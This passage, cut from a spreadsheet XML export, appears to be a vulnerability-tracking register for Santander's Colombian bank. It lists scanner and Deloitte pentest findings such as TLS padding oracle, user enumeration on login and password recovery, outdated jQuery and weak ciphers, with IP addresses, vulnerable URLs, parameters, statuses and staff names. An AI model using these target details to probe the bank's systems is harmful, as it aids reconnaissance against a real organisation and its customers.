    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-12-23T00:00:00"/>
    <n v="1643"/>
    <d v="2022-03-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-01-28T00:00:00"/>
    <s v="Se ha detectado una vulnerabilidad de oráculo de relleno TLS._x000a_Si una aplicación encuentra un error de protocolo fatal y luego llama a SSL_shutdown() dos veces (una para enviar un close_notify, y otra para recibir uno) entonces OpenSSL puede responder de manera diferente a la aplicación que llama si se recibe un registro de 0 bytes con relleno inválido en comparación con si se recibe un registro de 0 bytes con una MAC inválida. Si la aplicación se comporta de forma diferente basándose en esto de una manera_x000a_que es detectable para el par remoto, entonces esto equivale a un oráculo de relleno que podría ser utilizado para descifrar los datos._x000a_Lógica de detección de QID:_x000a_Este QID envía las múltiples cargas útiles de relleno tls para determinar la vulnerabilidad._x000a__x000a_Vulnerabilidad GOLDENDOODLE encontrada con ECDHE-RSA-AES256-SHA384 en TLSv1.2_x000a__x000a_El servidor devuelve datos válidos en respuesta a un relleno válido con una MAC no válida"/>
    <s v="Consulte la página oficial de github TLS Padding Oracles para conocer los productos afectados y los enlaces de los parches._x000a_Parches:_x000a_A continuación se muestran los enlaces para descargar los parches que corrigen las vulnerabilidades:_x000a_ Aviso de seguridad de OpenSSL: OpenSSL"/>
    <s v="Un atacante que pueda adoptar una posición de hombre en el medio (MitM) puede explotar esta vulnerabilidad y obtener acceso a la comunicación cifrada entre un cliente y un servidor."/>
    <s v="Sin definir"/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="182"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="89"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <s v="CVE-2020-1971_x000a_CVE-2021-23841_x000a_CVE-2021-23840_x000a_CVE-2021-3449"/>
    <s v="201.234.71.143"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2021-12-29T00:00:00"/>
    <n v="1637"/>
    <d v="2022-03-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-01-31T00:00:00"/>
    <s v="Según los datos del escaneo, la empresa tenía una vulnerabilidad CVE de gravedad media que estaba abierta más de 90 días después de la publicación de la CVE. Las CVE de gravedad media son aquellas con una gravedad CVSS documentada entre 4,0 y 6,9. La mejor práctica es mitigar o parchear las vulnerabilidades de gravedad media en un plazo de 90 días. Los detalles de cada vulnerabilidad se enumeran en la tabla siguiente."/>
    <s v="Supervise las listas de CVE y los repositorios de vulnerabilidades en busca de código de explotación que pueda afectar a su infraestructura. Suscríbase a la base de datos nacional de vulnerabilidades (NVD) RSS o a otras fuentes para recibir alertas sobre nuevos exploits y vulnerabilidades a medida que se publican. Mantenga un programa de actualización regular para todo el software y hardware en uso dentro de su empresa, asegurándose de que todos los parches más recientes se implementan a medida que se publican."/>
    <s v="Vulnerabilidad de gravedad media vista en la red más de 90 días después de la publicación de la CVE."/>
    <s v="Sin definir"/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="183"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="90"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <s v="CVE-2021-23840_x000a_CVE-2021-3449_x000a_CVE-2021-23841_x000a_CVE-2020-1971"/>
    <s v="201.234.71.143"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2021-12-29T00:00:00"/>
    <n v="1637"/>
    <d v="2022-03-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-01-31T00:00:00"/>
    <s v="Las vulnerabilidades y exposiciones comunes (CVE) son una lista de vulnerabilidades conocidas públicamente en software y hardware. Cada CVE contiene un ID, una descripción de la vulnerabilidad y los nombres de los productos y versiones que se ven afectados por la vulnerabilidad._x000a_El software y el hardware suelen informar por sí mismos del nombre y la versión de su producto cuando los hosts se conectan a ellos. Buscando en la lista CVE y cruzando los nombres y versiones de los productos encontrados en la red de esta empresa, podemos deducir la presencia de vulnerabilidades."/>
    <s v="Actualice o parchee el software y el hardware afectados. Habilite las actualizaciones automáticas si están disponibles en su proveedor de software y están permitidas en su entorno. Supervise las listas de CVE y los repositorios de vulnerabilidades en busca de código de explotación que pueda afectar a su infraestructura. Suscríbase a la lista de correo de Bugtraq para recibir alertas sobre nuevos exploits y vulnerabilidades a medida que se publican. Mantenga un programa de actualización regular para todo el software y hardware en uso dentro de su organización, asegurándose de que todos los parches más recientes se apliquen poco después de su publicación."/>
    <s v="Hemos observado una vulnerabilidad de gravedad media durante nuestro último escaneo, que todavía puede estar expuesta públicamente."/>
    <s v="Sin definir"/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="184"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-02efa0cd-fc06-4090-b21b-b8ccaa0a8df8"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2022-01-12T00:00:00"/>
    <n v="1623"/>
    <d v="2022-04-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-12-11T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web."/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplique controles de acceso a él."/>
    <m/>
    <d v="2023-09-30T00:00:00"/>
    <s v="falso positivo_x000a_RITM011127883"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="185"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="91"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="201.234.71.143"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-01-18T00:00:00"/>
    <n v="1617"/>
    <d v="2022-04-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-01-31T00:00:00"/>
    <s v="Cuando se emite un certificado, se firma con una clave privada. Los servicios de acceso público deben tener certificados firmados por claves asociadas a autoridades de certificación (CA). Las credenciales de las autoridades de certificación se almacenan en una tabla llamada almacén de confianza que está incorporada a los navegadores web y sistemas operativos modernos. Los certificados firmados por claves que no están en el almacén de confianza impiden a los clientes TLS conectarse a los servidores._x000a_El software y el hardware disponibles en el mercado suelen ejecutar servicios que utilizan certificados autofirmados por defecto. Si estos servicios son de acceso público, deben configurarse para utilizar certificados emitidos por autoridades de certificación conocidas. Si no se hace así, los usuarios del servicio se exponen a ataques de intermediario en la Internet abierta._x000a_Los certificados autofirmados tienen casos de uso limitados pero legítimos, como la protección de servicios cuyos clientes están configurados para utilizar la clave pública."/>
    <s v="Si el servicio no está en uso, desactívelo. De lo contrario, póngase en contacto con la CA y organice la emisión de un nuevo certificado."/>
    <s v="Los certificados autofirmados impiden que los clientes TLS se conecten a los servidores."/>
    <s v="Sin definir"/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="186"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="92"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="201.234.71.143"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-01-18T00:00:00"/>
    <n v="1617"/>
    <d v="2022-05-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-01-31T00:00:00"/>
    <s v="Cuando una autoridad de certificación (CA) emite un certificado, incluye dos fechas: la fecha en la que el certificado empieza a ser válido y la fecha en la que deja de serlo._x000a_Los algoritmos criptográficos no tienen una vida útil definida, pero los académicos, los investigadores y los estados nacionales los evalúan constantemente en busca de debilidades. El Foro de Autoridades de Certificación y Navegantes (CAB), un grupo de la industria que establece normas en torno a la creación y el uso de certificados, publica periódicamente actualizaciones de un documento denominado Requisitos Básicos (BR). Aproximadamente cada dos años se actualiza el BR para reducir el periodo máximo de validez de los certificados emitidos a partir de una fecha determinada. Los certificados más antiguos tienen períodos de validez más largos, pero los certificados emitidos después del 1 de septiembre de 2020 deben tener períodos de validez no superiores a 398 días."/>
    <s v="Si el servicio no está en uso, desactívelo. De lo contrario, póngase en contacto con la CA y organice la emisión de un nuevo certificado."/>
    <s v="Se observó un certificado con un periodo de validez superior al dictado por los requisitos básicos del foro del CAC."/>
    <s v="Sin definir"/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="187"/>
    <s v="BSNC"/>
    <s v="SecurityScorecard"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <m/>
    <m/>
    <x v="93"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <m/>
    <m/>
    <s v="201.234.71.143"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-01-18T00:00:00"/>
    <n v="1617"/>
    <d v="2022-05-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-01-31T00:00:00"/>
    <s v="Cuando una autoridad de certificación (CA) emite un certificado, incluye direcciones URL que pueden utilizarse para comprobar si un certificado ha sido revocado. Los certificados revocados dejan de ser válidos, y los clientes TLS (por ejemplo, los navegadores web) se negarán a conectarse a servidores que presenten certificados revocados._x000a_Los certificados se revocan por diversas razones: el desmantelamiento de un servidor, la retirada de un producto o nombre comercial, la renovación anticipada de un certificado de sustitución o la creencia de que un atacante puede haber adquirido la clave privada correspondiente al certificado._x000a_Si un certificado no incluye controles de revocación, no puede ser revocado. Emitir credenciales irrevocables es una violación de las mejores prácticas."/>
    <s v="Si el servicio no está en uso, desactívelo. De lo contrario, póngase en contacto con la CA y organice la emisión de un nuevo certificado."/>
    <s v="Se observó un certificado que no contenía ni CRL ni OCSP URL."/>
    <s v="Sin definir"/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="188"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-b840514a"/>
    <s v="SC-22-CNMPO-001-AP-001"/>
    <x v="64"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <s v="64.76.90.137"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <s v="https"/>
    <d v="2022-08-03T00:00:00"/>
    <n v="1420"/>
    <d v="2022-11-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-27T00:00:00"/>
    <s v="se ha podido comprobar, que la aplicación analizada devuelve una_x000a_respuesta diferente si se introduce un usuario válido en el sistema de uno que no lo es._x000a_Las funciones afectadas son:_x000a_· Recuperar contraseña_x000a_o URL afectada: https://confirmingfactoring._x000a_santander.com.co/factoring/common/mainPages/login.seam?FACTBOTTK_x000a_NCSR=&lt;token&gt;_x000a_o Parámetro: (POST) email"/>
    <s v="Se recomienda que los mecanismos de recuperación de contraseñas de la aplicación no_x000a_proporcionen evidencias que nos permitan discernir si el usuario introducido está dado de alta o_x000a_no en la misma, mediante mensajes de error, tamaño de las respuestas del servidor o tiempos de_x000a_respuesta de la aplicación, tal y como hemos identificado en el alcance de las presentes pruebas."/>
    <s v="Esta debilidad podría ser utilizada por un atacante o usuario malicioso para intentar obtener un_x000a_listado de los usuarios del sistema. Utilizando posteriormente dicha información para planificar y_x000a_generar ataques de mayor impacto, como, por ejemplo, ataques de averiguación de contraseñas o_x000a_fuerza bruta sobre usuarios existentes en el sistema."/>
    <d v="2022-11-30T00:00:00"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="189"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-b840514b"/>
    <s v="SC-22-CNMPO-001-VE-002"/>
    <x v="94"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="4.7"/>
    <m/>
    <s v="64.76.90.137"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <s v="https"/>
    <d v="2022-08-03T00:00:00"/>
    <n v="1420"/>
    <d v="2022-11-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-01-18T00:00:00"/>
    <s v="Se ha observado la presencia de una librería que se encuentra desactualizada. Adicionalmente, dicha_x000a_librería se encuentra fuera de soporte._x000a_· Librería no soportada: jQuery 1.3.2_x000a_URL afectada:_x000a_· https://confirmingfactoring._x000a_santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/framework.pack.js.sea_x000a_m"/>
    <s v="Se recomienda analizar la posibilidad de actualizar la librería afectada a la última versión_x000a_disponible._x000a_Adicionalmente se recomienda realizar el monitoreo regular de las actualizaciones de las librerías_x000a_en uso para todas las aplicaciones y asegurarse de instalarlas en un tiempo prudencial."/>
    <s v="Un individuo malicioso podría comprometer con mayor facilidad la librería afectada, ya que la_x000a_versión observada posee vulnerabilidades y/o debilidades de seguridad previamente reportadas. En_x000a_consecuencia, un individuo malicioso podría intentar explotarlas para comprometer a los usuarios_x000a_de la aplicación. Además, al estar fuera de soporte, el fabricante no proporcionará parches ni_x000a_actualizaciones para corregir las vulnerabilidades actuales y futuras."/>
    <d v="2022-11-30T00:00:00"/>
    <s v="La vulnerabilidad esta duplicada, es la misma del (SC-22-CNMPO-007-AP-001)"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="190"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-b840514c"/>
    <s v="SC-22-CNMPO-001-AP-003"/>
    <x v="95"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <s v="141.226.106.45"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-08-03T00:00:00"/>
    <n v="1420"/>
    <d v="2022-12-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-01-18T00:00:00"/>
    <s v="Se ha observado que la aplicación presenta el esquema de preguntas de seguridad como factor de_x000a_autenticación para la recuperación de contraseña. Adicionalmente el esquema de preguntas de_x000a_seguridad observado presenta oportunidades de mejora. A continuación, se detallan las debilidades_x000a_observadas en el mismo:_x000a_· Preguntas de seguridad disponibles de baja complejidad._x000a_· Las respuestas proporcionadas por el usuario no son enmascaradas en la interface web."/>
    <s v="El uso de preguntas de seguridad ha dejado de ser considerado un factor de autenticación por el_x000a_National Institute of Standarts and Tecnology (NIST), y se recomienda cambiar el mismo por un factor de autenticación diferente (por ejemplo, recuperación vía correo electrónico asociado a la cuenta)._x000a_Adicionalmente se recomienda cambiar las preguntas de seguridad ofrecidas por la aplicación, por_x000a_otras de mayor complejidad de respuesta y obtención para un usuario malicioso como, por ejemplo:_x000a_· ¿Cuál es el nombre de la escuela a la que aplicaste, pero no pudiste ir?_x000a_· ¿Cuál es el nombre de la primera escuela a la que recuerdas haber asistido?_x000a_· ¿Cuál fue el destino de tu viaje escolar más memorable?_x000a_Se recomienda adicionalmente tener un set de varias preguntas y que el usuario pueda elegir la que_x000a_más se adapte a su respuesta. Además, se recomienda modificar el tipo de datos de entrada para_x000a_los campos de texto del código HTML de las funcionalidades que solicitan el ingreso de respuestas a_x000a_las preguntas de seguridad, para asegurarse que las mismas sean enmascaradas al igual que los_x000a_campos de contraseña."/>
    <s v="Un débil esquema de preguntas de seguridad le proporciona a un individuo malicioso la oportunidad_x000a_de obtener el control de una cuenta de usuario válida. Al tener baja complejidad las preguntas_x000a_disponibles para el usuario, un usuario malicioso podría identificar la respuesta correcta si el mismo_x000a_tiene relación con la víctima o la pudo investigar a través de internet. Al no encontrarse ofuscado el_x000a_texto introducido en el campo de respuesta, se brinda la posibilidad a un individuo malicioso (que_x000a_se encuentre dentro de la proximidad de un usuario o a través de un software malicioso de captura_x000a_de pantalla) de obtener la respuesta para acceder de forma no autorizada a la aplicación."/>
    <d v="2022-11-30T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="191"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-b840514d"/>
    <s v="SC-22-CNMPO-001-AP-004"/>
    <x v="96"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <s v="141.226.106.45"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-08-03T00:00:00"/>
    <n v="1420"/>
    <d v="2022-12-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-27T00:00:00"/>
    <s v="Se ha observado que al acceder a la URL afectada se genera un mensaje de error propios de los_x000a_componentes del ambiente, que son propagado a la interfaz de usuario._x000a_La URL afectada es:_x000a_· https://confirming-factoring.santander.com.co/factoring/JavaScriptServlet"/>
    <s v="Se deben controlar todas las entradas o valores que el aplicativo recibe por parte del cliente, y_x000a_realizar un tratamiento seguro de sus valores evitando proporcionar información útil a un posible_x000a_atacante. Adicionalmente para no proporcionar información al atacante se recomienda personalizar_x000a_las páginas de error para que no sean descriptivas, dando siempre el mínimo de información_x000a_necesaria."/>
    <s v="El manejo inadecuado de errores puede presentar una variedad de problemas de seguridad para un_x000a_sitio web. El problema más común es cuando los mensajes de error internos detallados, como los_x000a_rastreos de la pila, se muestran al usuario. Estos mensajes revelan detalles de implementación que_x000a_nunca deberían revelarse. Dichos detalles pueden proporcionar a un posible atacante pistas_x000a_importantes sobre el funcionamiento interno de la aplicación y facilitar el proceso de explotación._x000a_Teniendo en cuenta toda esta información, se ha categorizado esta vulnerabilidad con riesgo leve."/>
    <d v="2022-11-30T00:00:00"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="192"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-b840514e"/>
    <s v="SC-22-CNMPO-001-AP-005"/>
    <x v="97"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <s v="141.226.106.45"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2022-08-03T00:00:00"/>
    <n v="1420"/>
    <d v="2022-12-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-27T00:00:00"/>
    <s v="La cabecera HTTP Cache-Control, incluye directivas específicas que restringen el almacenamiento_x000a_del contenido tanto enviado a como devuelto por la aplicación en sistemas de caché, ya sean estos_x000a_locales (equipo del usuario) como remotos (proxys de red)._x000a_Durante las pruebas realizadas se han detectado respuestas emitidas por la aplicación que no_x000a_limitan el almacenamiento de su contenido localmente en los equipos de los usuarios._x000a_Nota: La falta o configuración incorrecta de estos encabezados no representan la existencia efectiva de_x000a_información sensible que esté siendo cacheada por los navegadores o una posibilidad concreta de_x000a_explotación."/>
    <s v="Se recomienda modificar la cabecera HTTP “Cache-control”, incluir la directiva indicada, a todas las_x000a_respuestas devueltas por la aplicación y que puedan contener información sensible:_x000a_· Cache-control: no-store"/>
    <s v="Muchos navegadores, incluyendo Internet Explorer, cachean el contenido obtenido vía HTTPs a_x000a_menos que se indique lo contrario._x000a_Si estas respuestas almacenadas localmente incluyen contenido sensible éste podría ser leído por_x000a_otros usuarios con acceso al mismo equipo. Teniendo en cuenta toda esta información, se ha_x000a_categorizado esta vulnerabilidad con riesgo bajo._x000a_RECOMENDACIÓN"/>
    <d v="2022-11-30T00:00:00"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="193"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MAN-883485df"/>
    <s v="SC-22-CNMPA-002-AP-001"/>
    <x v="98"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="6.1"/>
    <s v="CVE-2020-11022_x000a_CVE-2020-11023"/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2022-08-03T00:00:00"/>
    <n v="1420"/>
    <d v="2022-11-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-07-30T00:00:00"/>
    <s v="En la versión utilizada se ha identificado las siguientes vulnerabilidades conocidas:_x000a__x000a_· CVE-2020-11022: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS_x000a_· CVE-2020-11023: Regex in its jQuery.htmlPrefilter sometimes may introduce XSS_x000a__x000a_Enlace afectado:_x000a_https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2f"/>
    <s v="Desarrolle una estrategia de administración de parches para garantizar que las actualizaciones de_x000a_seguridad se apliquen rápidamente a todas las bibliotecas de terceros en su aplicación._x000a_Además, considere reducir su superficie de ataque eliminando las bibliotecas que ya no están en_x000a_uso."/>
    <s v="La utilización de versiones vulnerables pueden ser utilizadas por posibles atacantes de forma_x000a_automatizada."/>
    <d v="2023-09-30T00:00:00"/>
    <s v="Fecha de decomiso:_x000a__x000a_31/12/2023"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="194"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MAN-88348814"/>
    <s v="SC-22-CNMPO-003-AP-001"/>
    <x v="52"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2022-08-03T00:00:00"/>
    <n v="1420"/>
    <d v="2022-11-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-07-30T00:00:00"/>
    <s v="Durante las pruebas se han identificado una manera de realizar enumeración de usuarios automatizada. Esto es debido a que el proceso de Login consta de un primer paso dónde se solicita el nombre de usuario, sin captcha, y se procede a comprobar si el usuario existe obteniendo información relativa del mismo para saber si esta bloqueado entre otra información._x000a__x000a_Esta petición de comprobación inicial, puede ser utilizada en procesos automatizados para llevar a cabo una enumeración de usuarios, pudiendo saber así, de entre una lista de usuarios, cuáles existen o no. Esto puede ser utilizado para realizar una segunda fase, dónde un atacante proceda al bloqueo continuado de una cuenta, y ataques de phishing en paralelo al usuario, si se conociese_x000a_el correo electrónico, u otro tipo de ataques similares."/>
    <s v="Se recomienda que el mecanismo de autenticación no proporcione evidencias que nos permitan discernir si el usuario introducido está dado de alta, o no, mediante mensajes de error, tamaño de las respuestas del servidor o tiempos de respuesta de la aplicación, tal y como hemos identificado en el alcance de las presentes pruebas."/>
    <s v="Esta debilidad podría ser utilizada por un atacante o usuario malicioso para intentar obtener un_x000a_listado de los usuarios del sistema. Utilizando posteriormente dicha información para planificar y_x000a_generar ataques de mayor impacto, como por ejemplo, ataques de averiguación de contraseñas,_x000a_ataques de phishing o fuerza bruta sobre usuarios existentes en el sistema. Un posible atacante_x000a_podría realizar una enumeración de usuarios en la plataforma, para posteriormente realizar ataques_x000a_de tipo “passwordSpraying”, entre otros contra la aplicación y así obtener acceso a alguna cuenta de_x000a_usuario o administrador._x000a_Teniendo en cuenta ésta configuración, se ha categorizado la vulnerabilidad como media."/>
    <s v="Sin definir"/>
    <s v="Fecha de decomiso:_x000a__x000a_31/12/2023"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="195"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="MAN-7b9da024"/>
    <s v="SCO-22-CNMPO-010-AP-001"/>
    <x v="99"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2022-09-22T00:00:00"/>
    <n v="1370"/>
    <d v="2023-01-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-12-21T00:00:00"/>
    <s v="La vulnerabilidad de Configuración insegura SSL/TLS hace referencia a la utilización de cifrados débiles en la capa de transporte que provee a un individuo malicioso oportunidades para comprometer exitosamente la información transmitida sobre un canal cifrado._x000a__x000a_Se ha observado que la aplicación presenta debilidades en la configuración de seguridad de los cifrados SSL/TLS. Estas debilidades incluyen:_x000a_• Conjuntos de cifrado CBC"/>
    <s v="Se recomienda analizar la posibilidad de rever si la configuración observada responde a un requisito de negocio. De lo contrario, se recomienda deshabilitar los conjuntos de cifrado que incluyan claves de cifrado CBC y configurar el orden de cifrado en el servidor con preferencias para utilizar conjuntos de cifrado PFS."/>
    <s v="Una explotación exitosa podría permitir a un atacante descifrar, leer o modificar los datos de tráfico interceptados, que pueden contener datos sensibles como la contraseña de inicio de sesión de un usuario u otros datos personales. Sin embargo, la vulnerabilidad sólo afecta a los usuarios para los que el atacante puede interceptar el tráfico. Los impactos de confidencialidad e integridad se limitan al ámbito del usuario interceptado. No se requiere autenticación alguna para realizar el ataque."/>
    <d v="2022-12-05T00:00:00"/>
    <s v="Certificada"/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="196"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="API Prospera"/>
    <s v="MAN-7b9da025"/>
    <s v="SCO-22-CNMPO-010-AP-002"/>
    <x v="100"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="2"/>
    <m/>
    <m/>
    <s v="https://prospera.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2022-09-22T00:00:00"/>
    <n v="1370"/>
    <d v="2023-01-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-12-21T00:00:00"/>
    <s v="La vulnerabilidad de exposición de información sensible hace referencia a la información expuesta por parte de la aplicación otorga detalles del entorno de desarrollo en uso, lo que provoca que un usuario malintencionado pueda realizar ataques más precisos sobre la aplicación._x000a__x000a_Se ha observado que la aplicación revela en la respuesta que realiza el servidor, información técnica de un recurso asociado a la compañía, esto sucede al enviar texto aleatorio en el cuerpo de la solicitud, en consecuencia, se exponen rutas de directorios internos pertenecientes al entorno Node.js y la cabecera “x-powered-by: Express” exponiendo la tecnología del servidor en uso."/>
    <s v="La recolección de información es, usualmente, el primer paso para realizar un ataque. La respuesta del servidor contiene información sobre las tecnologías en uso, que podría ser utilizada como base para un ataque posterior de mayor sofisticación. No se requiere autenticación para realizar el ataque."/>
    <s v="Se recomienda analizar la posibilidad de eliminar la información sensible expuesta a través de los recursos mencionados. Además, se recomienda actualizar los estándares de seguridad en el desarrollo y puesta en producción de servicios, de manera tal que contemple los riesgos asociados a la exposición de información sensible referente a la infraestructura interna, tales como nombres de servidores en uso y rutas de directorios del entorno de desarrollo."/>
    <d v="2022-12-03T00:00:00"/>
    <s v="la vulnerabilidad SCO-22-CNMPO-010-AP-002 se ha indicado en el nuevo informe con el ID SC-22-CNMPO-008-AP-002 y se ha cerrado la anterior."/>
    <s v="Martha Johanna Sanchez Sanchez"/>
  </r>
  <r>
    <n v="197"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="MAN-33d25a01"/>
    <s v="SC-22-CNMPO-006-CO-001"/>
    <x v="101"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <n v="443"/>
    <m/>
    <d v="2022-11-28T00:00:00"/>
    <n v="1303"/>
    <d v="2023-03-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
